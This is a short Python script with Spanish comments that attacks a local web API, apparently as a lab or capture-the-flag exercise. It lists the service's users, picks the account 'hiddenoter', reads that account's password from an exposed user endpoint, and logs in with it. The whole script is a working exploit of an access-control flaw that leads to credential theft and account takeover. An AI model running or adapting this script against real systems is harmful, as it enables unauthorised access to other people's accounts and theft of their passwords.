import requests

# Obtener los datos de los usuarios
response = requests.get("http://127.0.0.1:3000/usuarios")
usuarios = response.json()

# Buscar el usuario con el nombre "hiddenoter"
usuario = next(user for user in usuarios if user["name"] == "hiddenoter")
usuario_id = usuario["id"]

# Obtener la contraseña del usuario
response = requests.get(f"http://127.0.0.1:3000/usuarios/{usuario_id}")
password = response.json()["password"]

# Hacer login con los datos obtenidos
login_data = {
    "name": "hiddenoter",
    "password": password
}
response = requests.post("http://127.0.0.1:3000/login", json=login_data)
print(response.text)
